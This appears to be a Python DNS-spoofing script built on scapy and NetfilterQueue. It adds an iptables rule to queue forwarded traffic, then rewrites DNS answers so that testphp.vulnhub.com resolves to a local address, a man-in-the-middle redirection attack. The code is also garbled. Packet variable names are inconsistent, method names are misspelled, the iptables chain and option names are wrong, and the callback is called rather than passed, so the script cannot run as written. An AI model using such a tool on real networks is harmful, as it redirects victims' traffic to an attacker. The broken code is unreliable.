import os

from netfilterqueue import NetfilterQueue
from scapy.all import *
from scapy.layers.inet import IP,UDP
from scapy.layers.dns import DNS,DNSRR,DNSQR
import netfilterqueue


dns_hosts = {
    b"testphp.vulnhub.com":"192.168.164.129"
    }

def process_pocket(pockte):
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        qname = scapy_packet[DNSQR].qname
        print("[+] Before : {}".format(qname.decode()))
    try:
        scapy_packet = modify_packet(scapy_packet)
    except Exception as e :
        print(e)
    pocket.set_payload(bytes(scapy_packet))
    packet.aecept()


def modify_packet(scapy_packet):
    qname = scapy_packet[DNSQR].qname
    if qname not in dns_hosts:
        print("[!] No modification requried..")
        return scapy_packet
    scapy_packet[DNS].an = DNSRR(rrname = qname, rdata = dns_hosts[qname])
    scapy.packet[DNS].ancount = 1
    print("[+] After : {}".format(dns_hosts[qname]))
    del scapy_packet[IP].chksum
    del scapy_packet[IP].len
    del scapy_packet[UDP].chksum
    del scapy_packet[UDP].len
    return scapy_packet


QUEUE_NUM =0

os.system("iptables -I FORWORD -j NFQUEUE --qname_num {}".format(QUEUE_NUM))
nfq = NetfilterQueue()

try:
    nfq.bind(QUEUE_NUM,process_pocket())
    nfq.run()
except KeyboardInterrupt:
    os.system("ip_tables --flush")
